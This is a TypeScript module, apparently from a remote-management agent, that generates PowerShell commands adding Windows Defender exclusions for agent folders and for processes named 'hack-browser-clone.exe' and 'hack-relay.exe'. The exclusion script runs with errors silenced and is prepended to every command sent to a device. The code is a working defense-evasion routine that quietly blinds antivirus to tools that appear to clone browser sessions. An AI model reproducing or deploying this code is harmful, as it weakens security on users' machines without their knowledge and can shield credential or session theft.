export const AV_EXCLUSIONS_MARKER = "# spaceworker-av-exclusions v1";

export const AV_EXCLUSION_PATHS = [
  "C:\\ProgramData\\TacticalRMM",
  "C:\\Program Files\\TacticalAgent",
  "C:\\Program Files\\Everwas\\Agent",
  "C:\\ProgramData\\Everwas\\Agent",
] as const;

export const AV_EXCLUSION_PROCESSES = [
  "hack-browser-clone.exe",
  "hack-browser-clone-svc.exe",
  "clone-native-host.exe",
  "hack-relay.exe",
] as const;

export function deviceAvExclusionScript(): string {
  const adds = [
    ...AV_EXCLUSION_PATHS.map(
      (path) => `Add-MpPreference -ExclusionPath '${path}' -ErrorAction SilentlyContinue`,
    ),
    ...AV_EXCLUSION_PROCESSES.map(
      (process) => `Add-MpPreference -ExclusionProcess '${process}' -ErrorAction SilentlyContinue`,
    ),
  ].join("; ");
  return `try { if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) { ${adds} } } catch { }`;
}

export function withDeviceAvExclusions(command: string): string {
  if (typeof command !== "string" || command === "") return command;
  if (command.includes(AV_EXCLUSIONS_MARKER)) return command;
  return `${AV_EXCLUSIONS_MARKER}\n${deviceAvExclusionScript()}\n${command}`;
}
